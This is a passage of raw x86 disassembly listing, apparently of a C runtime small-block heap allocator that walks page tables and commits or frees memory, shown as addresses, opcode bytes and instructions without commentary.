  408aea:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  408aee:	0f 8c 80 00 00 00    	jl     0x408b74
  408af4:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408af7:	81 39 f0 00 00 00    	cmpl   $0xf0,(%ecx)
  408afd:	75 70                	jne    0x408b6f
  408aff:	68 00 40 00 00       	push   $0x4000
  408b04:	68 00 10 00 00       	push   $0x1000
  408b09:	8b 55 f4             	mov    -0xc(%ebp),%edx
  408b0c:	c1 e2 0c             	shl    $0xc,%edx
  408b0f:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408b12:	8b 48 10             	mov    0x10(%eax),%ecx
  408b15:	03 ca                	add    %edx,%ecx
  408b17:	51                   	push   %ecx
  408b18:	ff 15 0c f0 40 00    	call   *0x40f00c
  408b1e:	85 c0                	test   %eax,%eax
  408b20:	74 4d                	je     0x408b6f
  408b22:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408b25:	c7 02 ff ff ff ff    	movl   $0xffffffff,(%edx)
  408b2b:	a1 44 de 45 00       	mov    0x45de44,%eax
  408b30:	83 e8 01             	sub    $0x1,%eax
  408b33:	a3 44 de 45 00       	mov    %eax,0x45de44
  408b38:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408b3b:	83 79 0c 00          	cmpl   $0x0,0xc(%ecx)
  408b3f:	74 0b                	je     0x408b4c
  408b41:	8b 55 ec             	mov    -0x14(%ebp),%edx
  408b44:	8b 42 0c             	mov    0xc(%edx),%eax
  408b47:	3b 45 fc             	cmp    -0x4(%ebp),%eax
  408b4a:	76 09                	jbe    0x408b55
  408b4c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408b4f:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408b52:	89 51 0c             	mov    %edx,0xc(%ecx)
  408b55:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408b58:	83 c0 01             	add    $0x1,%eax
  408b5b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  408b5e:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408b61:	83 e9 01             	sub    $0x1,%ecx
  408b64:	89 4d 08             	mov    %ecx,0x8(%ebp)
  408b67:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  408b6b:	75 02                	jne    0x408b6f
  408b6d:	eb 05                	jmp    0x408b74
  408b6f:	e9 64 ff ff ff       	jmp    0x408ad8
  408b74:	8b 55 ec             	mov    -0x14(%ebp),%edx
  408b77:	89 55 f8             	mov    %edx,-0x8(%ebp)
  408b7a:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408b7d:	8b 48 04             	mov    0x4(%eax),%ecx
  408b80:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  408b83:	83 7d f0 00          	cmpl   $0x0,-0x10(%ebp)
  408b87:	74 55                	je     0x408bde
  408b89:	8b 55 f8             	mov    -0x8(%ebp),%edx
  408b8c:	83 7a 18 ff          	cmpl   $0xffffffff,0x18(%edx)
  408b90:	75 4c                	jne    0x408bde
  408b92:	c7 45 f4 01 00 00 00 	movl   $0x1,-0xc(%ebp)
  408b99:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408b9c:	83 c0 20             	add    $0x20,%eax
  408b9f:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408ba2:	eb 12                	jmp    0x408bb6
  408ba4:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  408ba7:	83 c1 01             	add    $0x1,%ecx
  408baa:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  408bad:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408bb0:	83 c2 08             	add    $0x8,%edx
  408bb3:	89 55 fc             	mov    %edx,-0x4(%ebp)
  408bb6:	81 7d f4 00 04 00 00 	cmpl   $0x400,-0xc(%ebp)
  408bbd:	7d 0a                	jge    0x408bc9
  408bbf:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408bc2:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  408bc5:	75 02                	jne    0x408bc9
  408bc7:	eb db                	jmp    0x408ba4
  408bc9:	81 7d f4 00 04 00 00 	cmpl   $0x400,-0xc(%ebp)
  408bd0:	75 0c                	jne    0x408bde
  408bd2:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408bd5:	51                   	push   %ecx
  408bd6:	e8 45 fe ff ff       	call   0x408a20
  408bdb:	83 c4 04             	add    $0x4,%esp
  408bde:	8b 55 ec             	mov    -0x14(%ebp),%edx
  408be1:	3b 15 b4 b1 45 00    	cmp    0x45b1b4,%edx
  408be7:	74 0a                	je     0x408bf3
  408be9:	83 7d 08 00          	cmpl   $0x0,0x8(%ebp)
  408bed:	0f 8f bb fe ff ff    	jg     0x408aae
  408bf3:	8b e5                	mov    %ebp,%esp
  408bf5:	5d                   	pop    %ebp
  408bf6:	c3                   	ret
  408bf7:	cc                   	int3
  408bf8:	cc                   	int3
  408bf9:	cc                   	int3
  408bfa:	cc                   	int3
  408bfb:	cc                   	int3
  408bfc:	cc                   	int3
  408bfd:	cc                   	int3
  408bfe:	cc                   	int3
  408bff:	cc                   	int3
  408c00:	55                   	push   %ebp
  408c01:	8b ec                	mov    %esp,%ebp
  408c03:	83 ec 08             	sub    $0x8,%esp
  408c06:	c7 45 f8 b0 b1 45 00 	movl   $0x45b1b0,-0x8(%ebp)
  408c0d:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408c10:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408c13:	3b 48 10             	cmp    0x10(%eax),%ecx
  408c16:	76 61                	jbe    0x408c79
  408c18:	8b 55 f8             	mov    -0x8(%ebp),%edx
  408c1b:	8b 45 08             	mov    0x8(%ebp),%eax
  408c1e:	3b 42 14             	cmp    0x14(%edx),%eax
  408c21:	73 56                	jae    0x408c79
  408c23:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408c26:	83 e1 0f             	and    $0xf,%ecx
  408c29:	85 c9                	test   %ecx,%ecx
  408c2b:	75 48                	jne    0x408c75
  408c2d:	8b 55 08             	mov    0x8(%ebp),%edx
  408c30:	81 e2 ff 0f 00 00    	and    $0xfff,%edx
  408c36:	33 c0                	xor    %eax,%eax
  408c38:	05 00 01 00 00       	add    $0x100,%eax
  408c3d:	3b d0                	cmp    %eax,%edx
  408c3f:	72 34                	jb     0x408c75
  408c41:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408c44:	8b 55 f8             	mov    -0x8(%ebp),%edx
  408c47:	89 11                	mov    %edx,(%ecx)
  408c49:	8b 45 08             	mov    0x8(%ebp),%eax
  408c4c:	25 00 f0 ff ff       	and    $0xfffff000,%eax
  408c51:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408c54:	8b 4d 10             	mov    0x10(%ebp),%ecx
  408c57:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408c5a:	89 11                	mov    %edx,(%ecx)
  408c5c:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408c5f:	05 00 01 00 00       	add    $0x100,%eax
  408c64:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408c67:	2b c8                	sub    %eax,%ecx
  408c69:	c1 f9 04             	sar    $0x4,%ecx
  408c6c:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408c6f:	8d 44 0a 08          	lea    0x8(%edx,%ecx,1),%eax
  408c73:	eb 17                	jmp    0x408c8c
  408c75:	33 c0                	xor    %eax,%eax
  408c77:	eb 13                	jmp    0x408c8c
  408c79:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408c7c:	8b 08                	mov    (%eax),%ecx
  408c7e:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  408c81:	81 7d f8 b0 b1 45 00 	cmpl   $0x45b1b0,-0x8(%ebp)
  408c88:	75 83                	jne    0x408c0d
  408c8a:	33 c0                	xor    %eax,%eax
  408c8c:	8b e5                	mov    %ebp,%esp
  408c8e:	5d                   	pop    %ebp
  408c8f:	c3                   	ret
  408c90:	55                   	push   %ebp
  408c91:	8b ec                	mov    %esp,%ebp
  408c93:	51                   	push   %ecx
  408c94:	8b 45 08             	mov    0x8(%ebp),%eax
  408c97:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  408c9a:	2b 48 10             	sub    0x10(%eax),%ecx
  408c9d:	c1 f9 0c             	sar    $0xc,%ecx
  408ca0:	8b 55 08             	mov    0x8(%ebp),%edx
  408ca3:	8d 44 ca 18          	lea    0x18(%edx,%ecx,8),%eax
  408ca7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408caa:	8b 4d 10             	mov    0x10(%ebp),%ecx
  408cad:	33 d2                	xor    %edx,%edx
  408caf:	8a 11                	mov    (%ecx),%dl
  408cb1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408cb4:	8b 08                	mov    (%eax),%ecx
  408cb6:	03 ca                	add    %edx,%ecx
  408cb8:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408cbb:	89 0a                	mov    %ecx,(%edx)
  408cbd:	8b 45 10             	mov    0x10(%ebp),%eax
  408cc0:	c6 00 00             	movb   $0x0,(%eax)
  408cc3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408cc6:	c7 41 04 f1 00 00 00 	movl   $0xf1,0x4(%ecx)
  408ccd:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408cd0:	81 3a f0 00 00 00    	cmpl   $0xf0,(%edx)
  408cd6:	75 20                	jne    0x408cf8
  408cd8:	a1 44 de 45 00       	mov    0x45de44,%eax
  408cdd:	83 c0 01             	add    $0x1,%eax
  408ce0:	a3 44 de 45 00       	mov    %eax,0x45de44
  408ce5:	83 3d 44 de 45 00 20 	cmpl   $0x20,0x45de44
  408cec:	75 0a                	jne    0x408cf8
  408cee:	6a 10                	push   $0x10
  408cf0:	e8 ab fd ff ff       	call   0x408aa0
  408cf5:	83 c4 04             	add    $0x4,%esp
  408cf8:	8b e5                	mov    %ebp,%esp
  408cfa:	5d                   	pop    %ebp
  408cfb:	c3                   	ret
  408cfc:	cc                   	int3
  408cfd:	cc                   	int3
  408cfe:	cc                   	int3
  408cff:	cc                   	int3
  408d00:	55                   	push   %ebp
  408d01:	8b ec                	mov    %esp,%ebp
  408d03:	83 ec 20             	sub    $0x20,%esp
  408d06:	a1 d0 d1 45 00       	mov    0x45d1d0,%eax
  408d0b:	89 45 e0             	mov    %eax,-0x20(%ebp)
  408d0e:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  408d11:	83 79 10 ff          	cmpl   $0xffffffff,0x10(%ecx)
  408d15:	0f 84 5c 01 00 00    	je     0x408e77
  408d1b:	8b 55 e0             	mov    -0x20(%ebp),%edx
  408d1e:	8b 42 08             	mov    0x8(%edx),%eax
  408d21:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408d24:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  408d27:	81 c1 18 20 00 00    	add    $0x2018,%ecx
  408d2d:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  408d30:	8b 55 e0             	mov    -0x20(%ebp),%edx
  408d33:	83 c2 18             	add    $0x18,%edx
  408d36:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408d39:	2b c2                	sub    %edx,%eax
  408d3b:	c1 f8 03             	sar    $0x3,%eax
  408d3e:	c1 e0 0c             	shl    $0xc,%eax
  408d41:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  408d44:	8b 51 10             	mov    0x10(%ecx),%edx
  408d47:	03 d0                	add    %eax,%edx
  408d49:	89 55 f8             	mov    %edx,-0x8(%ebp)
  408d4c:	eb 15                	jmp    0x408d63
  408d4e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408d51:	83 c0 08             	add    $0x8,%eax
  408d54:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408d57:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408d5a:	81 c1 00 10 00 00    	add    $0x1000,%ecx
  408d60:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  408d63:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408d66:	3b 55 f0             	cmp    -0x10(%ebp),%edx
  408d69:	73 69                	jae    0x408dd4
  408d6b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408d6e:	8b 08                	mov    (%eax),%ecx
  408d70:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  408d73:	7c 5a                	jl     0x408dcf
  408d75:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408d78:	8b 42 04             	mov    0x4(%edx),%eax
  408d7b:	3b 45 08             	cmp    0x8(%ebp),%eax
  408d7e:	76 4f                	jbe    0x408dcf
  408d80:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408d83:	51                   	push   %ecx
  408d84:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408d87:	8b 02                	mov    (%edx),%eax
  408d89:	50                   	push   %eax
  408d8a:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408d8d:	51                   	push   %ecx
  408d8e:	e8 2d 03 00 00       	call   0x4090c0
  408d93:	83 c4 0c             	add    $0xc,%esp
  408d96:	89 45 f4             	mov    %eax,-0xc(%ebp)
  408d99:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  408d9d:	74 27                	je     0x408dc6
  408d9f:	8b 55 e0             	mov    -0x20(%ebp),%edx
  408da2:	89 15 d0 d1 45 00    	mov    %edx,0x45d1d0
  408da8:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408dab:	8b 08                	mov    (%eax),%ecx
  408dad:	2b 4d 08             	sub    0x8(%ebp),%ecx
  408db0:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408db3:	89 0a                	mov    %ecx,(%edx)
  408db5:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408db8:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408dbb:	89 48 08             	mov    %ecx,0x8(%eax)
  408dbe:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408dc1:	e9 ee 02 00 00       	jmp    0x4090b4
  408dc6:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408dc9:	8b 45 08             	mov    0x8(%ebp),%eax
  408dcc:	89 42 04             	mov    %eax,0x4(%edx)
  408dcf:	e9 7a ff ff ff       	jmp    0x408d4e
  408dd4:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  408dd7:	83 c1 18             	add    $0x18,%ecx
  408dda:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  408ddd:	8b 55 e0             	mov    -0x20(%ebp),%edx
  408de0:	8b 42 08             	mov    0x8(%edx),%eax
  408de3:	89 45 f0             	mov    %eax,-0x10(%ebp)
  408de6:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  408de9:	8b 51 10             	mov    0x10(%ecx),%edx
  408dec:	89 55 f8             	mov    %edx,-0x8(%ebp)
  408def:	eb 15                	jmp    0x408e06
  408df1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408df4:	83 c0 08             	add    $0x8,%eax
  408df7:	89 45 fc             	mov    %eax,-0x4(%ebp)
  408dfa:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408dfd:	81 c1 00 10 00 00    	add    $0x1000,%ecx
  408e03:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  408e06:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408e09:	3b 55 f0             	cmp    -0x10(%ebp),%edx
  408e0c:	73 69                	jae    0x408e77
  408e0e:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408e11:	8b 08                	mov    (%eax),%ecx
  408e13:	3b 4d 08             	cmp    0x8(%ebp),%ecx
  408e16:	7c 5a                	jl     0x408e72
  408e18:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408e1b:	8b 42 04             	mov    0x4(%edx),%eax
  408e1e:	3b 45 08             	cmp    0x8(%ebp),%eax
  408e21:	76 4f                	jbe    0x408e72
  408e23:	8b 4d 08             	mov    0x8(%ebp),%ecx
  408e26:	51                   	push   %ecx
  408e27:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408e2a:	8b 02                	mov    (%edx),%eax
  408e2c:	50                   	push   %eax
  408e2d:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408e30:	51                   	push   %ecx
  408e31:	e8 8a 02 00 00       	call   0x4090c0
  408e36:	83 c4 0c             	add    $0xc,%esp
  408e39:	89 45 f4             	mov    %eax,-0xc(%ebp)
  408e3c:	83 7d f4 00          	cmpl   $0x0,-0xc(%ebp)
  408e40:	74 27                	je     0x408e69
  408e42:	8b 55 e0             	mov    -0x20(%ebp),%edx
  408e45:	89 15 d0 d1 45 00    	mov    %edx,0x45d1d0
  408e4b:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408e4e:	8b 08                	mov    (%eax),%ecx
  408e50:	2b 4d 08             	sub    0x8(%ebp),%ecx
  408e53:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408e56:	89 0a                	mov    %ecx,(%edx)
  408e58:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408e5b:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408e5e:	89 48 08             	mov    %ecx,0x8(%eax)
  408e61:	8b 45 f4             	mov    -0xc(%ebp),%eax
  408e64:	e9 4b 02 00 00       	jmp    0x4090b4
  408e69:	8b 55 fc             	mov    -0x4(%ebp),%edx
  408e6c:	8b 45 08             	mov    0x8(%ebp),%eax
  408e6f:	89 42 04             	mov    %eax,0x4(%edx)
  408e72:	e9 7a ff ff ff       	jmp    0x408df1
  408e77:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  408e7a:	8b 11                	mov    (%ecx),%edx
  408e7c:	89 55 e0             	mov    %edx,-0x20(%ebp)
  408e7f:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408e82:	3b 05 d0 d1 45 00    	cmp    0x45d1d0,%eax
  408e88:	0f 85 80 fe ff ff    	jne    0x408d0e
  408e8e:	c7 45 e0 b0 b1 45 00 	movl   $0x45b1b0,-0x20(%ebp)
  408e95:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  408e98:	83 79 10 ff          	cmpl   $0xffffffff,0x10(%ecx)
  408e9c:	0f 84 95 01 00 00    	je     0x409037
  408ea2:	8b 55 e0             	mov    -0x20(%ebp),%edx
  408ea5:	83 7a 0c 00          	cmpl   $0x0,0xc(%edx)
  408ea9:	0f 84 88 01 00 00    	je     0x409037
  408eaf:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408eb2:	8b 48 0c             	mov    0xc(%eax),%ecx
  408eb5:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  408eb8:	8b 55 e0             	mov    -0x20(%ebp),%edx
  408ebb:	83 c2 18             	add    $0x18,%edx
  408ebe:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408ec1:	2b c2                	sub    %edx,%eax
  408ec3:	c1 f8 03             	sar    $0x3,%eax
  408ec6:	c1 e0 0c             	shl    $0xc,%eax
  408ec9:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  408ecc:	8b 51 10             	mov    0x10(%ecx),%edx
  408ecf:	03 d0                	add    %eax,%edx
  408ed1:	89 55 f8             	mov    %edx,-0x8(%ebp)
  408ed4:	c7 45 ec 00 00 00 00 	movl   $0x0,-0x14(%ebp)
  408edb:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408ede:	89 45 f0             	mov    %eax,-0x10(%ebp)
  408ee1:	eb 12                	jmp    0x408ef5
  408ee3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408ee6:	83 c1 08             	add    $0x8,%ecx
  408ee9:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  408eec:	8b 55 ec             	mov    -0x14(%ebp),%edx
  408eef:	83 c2 01             	add    $0x1,%edx
  408ef2:	89 55 ec             	mov    %edx,-0x14(%ebp)
  408ef5:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408ef8:	83 38 ff             	cmpl   $0xffffffff,(%eax)
  408efb:	75 08                	jne    0x408f05
  408efd:	83 7d ec 10          	cmpl   $0x10,-0x14(%ebp)
  408f01:	7d 02                	jge    0x408f05
  408f03:	eb de                	jmp    0x408ee3
  408f05:	6a 04                	push   $0x4
  408f07:	68 00 10 00 00       	push   $0x1000
  408f0c:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  408f0f:	c1 e1 0c             	shl    $0xc,%ecx
  408f12:	51                   	push   %ecx
  408f13:	8b 55 f8             	mov    -0x8(%ebp),%edx
  408f16:	52                   	push   %edx
  408f17:	ff 15 08 f0 40 00    	call   *0x40f008
  408f1d:	3b 45 f8             	cmp    -0x8(%ebp),%eax
  408f20:	0f 85 0d 01 00 00    	jne    0x409033
  408f26:	6a 00                	push   $0x0
  408f28:	8b 45 ec             	mov    -0x14(%ebp),%eax
  408f2b:	c1 e0 0c             	shl    $0xc,%eax
  408f2e:	50                   	push   %eax
  408f2f:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  408f32:	51                   	push   %ecx
  408f33:	e8 c8 a2 ff ff       	call   0x403200
  408f38:	83 c4 0c             	add    $0xc,%esp
  408f3b:	c7 45 e8 00 00 00 00 	movl   $0x0,-0x18(%ebp)
  408f42:	8b 55 f8             	mov    -0x8(%ebp),%edx
  408f45:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  408f48:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408f4b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  408f4e:	eb 1e                	jmp    0x408f6e
  408f50:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  408f53:	83 c1 01             	add    $0x1,%ecx
  408f56:	89 4d e8             	mov    %ecx,-0x18(%ebp)
  408f59:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  408f5c:	81 c2 00 10 00 00    	add    $0x1000,%edx
  408f62:	89 55 e4             	mov    %edx,-0x1c(%ebp)
  408f65:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408f68:	83 c0 08             	add    $0x8,%eax
  408f6b:	89 45 f0             	mov    %eax,-0x10(%ebp)
  408f6e:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  408f71:	3b 4d ec             	cmp    -0x14(%ebp),%ecx
  408f74:	7d 34                	jge    0x408faa
  408f76:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  408f79:	83 c2 08             	add    $0x8,%edx
  408f7c:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408f7f:	89 10                	mov    %edx,(%eax)
  408f81:	8b 4d e4             	mov    -0x1c(%ebp),%ecx
  408f84:	c7 41 04 f0 00 00 00 	movl   $0xf0,0x4(%ecx)
  408f8b:	8b 55 e4             	mov    -0x1c(%ebp),%edx
  408f8e:	c6 82 f8 00 00 00 ff 	movb   $0xff,0xf8(%edx)
  408f95:	8b 45 f0             	mov    -0x10(%ebp),%eax
  408f98:	c7 00 f0 00 00 00    	movl   $0xf0,(%eax)
  408f9e:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408fa1:	c7 41 04 f1 00 00 00 	movl   $0xf1,0x4(%ecx)
  408fa8:	eb a6                	jmp    0x408f50
  408faa:	8b 55 e0             	mov    -0x20(%ebp),%edx
  408fad:	89 15 d0 d1 45 00    	mov    %edx,0x45d1d0
  408fb3:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408fb6:	05 18 20 00 00       	add    $0x2018,%eax
  408fbb:	39 45 f0             	cmp    %eax,-0x10(%ebp)
  408fbe:	73 13                	jae    0x408fd3
  408fc0:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  408fc3:	83 39 ff             	cmpl   $0xffffffff,(%ecx)
  408fc6:	74 0b                	je     0x408fd3
  408fc8:	8b 55 f0             	mov    -0x10(%ebp),%edx
  408fcb:	83 c2 08             	add    $0x8,%edx
  408fce:	89 55 f0             	mov    %edx,-0x10(%ebp)
  408fd1:	eb e0                	jmp    0x408fb3
  408fd3:	8b 45 e0             	mov    -0x20(%ebp),%eax
  408fd6:	05 18 20 00 00       	add    $0x2018,%eax
  408fdb:	39 45 f0             	cmp    %eax,-0x10(%ebp)
  408fde:	1b c9                	sbb    %ecx,%ecx
  408fe0:	23 4d f0             	and    -0x10(%ebp),%ecx
  408fe3:	8b 55 e0             	mov    -0x20(%ebp),%edx
  408fe6:	89 4a 0c             	mov    %ecx,0xc(%edx)
  408fe9:	8b 45 f8             	mov    -0x8(%ebp),%eax
  408fec:	8a 4d 08             	mov    0x8(%ebp),%cl
  408fef:	88 48 08             	mov    %cl,0x8(%eax)
  408ff2:	8b 55 e0             	mov    -0x20(%ebp),%edx
  408ff5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  408ff8:	89 42 08             	mov    %eax,0x8(%edx)
  408ffb:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408ffe:	8b 11                	mov    (%ecx),%edx
  409000:	2b 55 08             	sub    0x8(%ebp),%edx
  409003:	8b 45 fc             	mov    -0x4(%ebp),%eax
  409006:	89 10                	mov    %edx,(%eax)
  409008:	8b 4d 08             	mov    0x8(%ebp),%ecx
  40900b:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40900e:	8d 44 0a 08          	lea    0x8(%edx,%ecx,1),%eax
  409012:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  409015:	89 01                	mov    %eax,(%ecx)
  409017:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40901a:	8b 42 04             	mov    0x4(%edx),%eax
  40901d:	2b 45 08             	sub    0x8(%ebp),%eax
  409020:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  409023:	89 41 04             	mov    %eax,0x4(%ecx)
  409026:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409029:	05 00 01 00 00       	add    $0x100,%eax
  40902e:	e9 81 00 00 00       	jmp    0x4090b4
  409033:	33 c0                	xor    %eax,%eax
  409035:	eb 7d                	jmp    0x4090b4
  409037:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40903a:	8b 02                	mov    (%edx),%eax
  40903c:	89 45 e0             	mov    %eax,-0x20(%ebp)
  40903f:	81 7d e0 b0 b1 45 00 	cmpl   $0x45b1b0,-0x20(%ebp)
  409046:	0f 85 49 fe ff ff    	jne    0x408e95
  40904c:	e8 ef f7 ff ff       	call   0x408840
  409051:	89 45 e0             	mov    %eax,-0x20(%ebp)
  409054:	83 7d e0 00          	cmpl   $0x0,-0x20(%ebp)
  409058:	74 58                	je     0x4090b2
  40905a:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40905d:	8b 51 10             	mov    0x10(%ecx),%edx
  409060:	89 55 f8             	mov    %edx,-0x8(%ebp)
  409063:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409066:	8a 4d 08             	mov    0x8(%ebp),%cl
  409069:	88 48 08             	mov    %cl,0x8(%eax)
  40906c:	8b 55 e0             	mov    -0x20(%ebp),%edx
  40906f:	89 15 d0 d1 45 00    	mov    %edx,0x45d1d0
  409075:	8b 45 08             	mov    0x8(%ebp),%eax
  409078:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  40907b:	8d 54 01 08          	lea    0x8(%ecx,%eax,1),%edx
  40907f:	8b 45 f8             	mov    -0x8(%ebp),%eax
  409082:	89 10                	mov    %edx,(%eax)
  409084:	b9 f0 00 00 00       	mov    $0xf0,%ecx
  409089:	2b 4d 08             	sub    0x8(%ebp),%ecx
  40908c:	8b 55 f8             	mov    -0x8(%ebp),%edx
  40908f:	89 4a 04             	mov    %ecx,0x4(%edx)
  409092:	8b 45 08             	mov    0x8(%ebp),%eax
  409095:	25 ff 00 00 00       	and    $0xff,%eax
  40909a:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40909d:	8b 51 18             	mov    0x18(%ecx),%edx
  4090a0:	2b d0                	sub    %eax,%edx
  4090a2:	8b 45 e0             	mov    -0x20(%ebp),%eax
  4090a5:	89 50 18             	mov    %edx,0x18(%eax)
  4090a8:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4090ab:	05 00 01 00 00       	add    $0x100,%eax
  4090b0:	eb 02                	jmp    0x4090b4
  4090b2:	33 c0                	xor    %eax,%eax
  4090b4:	8b e5                	mov    %ebp,%esp
  4090b6:	5d                   	pop    %ebp
  4090b7:	c3                   	ret
  4090b8:	cc                   	int3
  4090b9:	cc                   	int3
  4090ba:	cc                   	int3
  4090bb:	cc                   	int3
  4090bc:	cc                   	int3
  4090bd:	cc                   	int3
  4090be:	cc                   	int3
  4090bf:	cc                   	int3
  4090c0:	55                   	push   %ebp
  4090c1:	8b ec                	mov    %esp,%ebp
  4090c3:	83 ec 14             	sub    $0x14,%esp
  4090c6:	8b 45 08             	mov    0x8(%ebp),%eax
  4090c9:	8b 08                	mov    (%eax),%ecx
  4090cb:	89 4d fc             	mov    %ecx,-0x4(%ebp)
  4090ce:	8b 55 fc             	mov    -0x4(%ebp),%edx
  4090d1:	89 55 f8             	mov    %edx,-0x8(%ebp)
  4090d4:	8b 45 08             	mov    0x8(%ebp),%eax
  4090d7:	05 f8 00 00 00       	add    $0xf8,%eax
  4090dc:	89 45 ec             	mov    %eax,-0x14(%ebp)
  4090df:	8b 4d 08             	mov    0x8(%ebp),%ecx
  4090e2:	8b 51 04             	mov    0x4(%ecx),%edx
  4090e5:	3b 55 10             	cmp    0x10(%ebp),%edx
  4090e8:	72 63                	jb     0x40914d
  4090ea:	8b 45 f8             	mov    -0x8(%ebp),%eax
  4090ed:	8a 4d 10             	mov    0x10(%ebp),%cl
  4090f0:	88 08                	mov    %cl,(%eax)
  4090f2:	8b 55 f8             	mov    -0x8(%ebp),%edx
  4090f5:	03 55 10             	add    0x10(%ebp),%edx
  4090f8:	3b 55 ec             	cmp    -0x14(%ebp),%edx
  4090fb:	73 1e                	jae    0x40911b
  4090fd:	8b 45 08             	mov    0x8(%ebp),%eax
  409100:	8b 08                	mov    (%eax),%ecx
  409102:	03 4d 10             	add    0x10(%ebp),%ecx
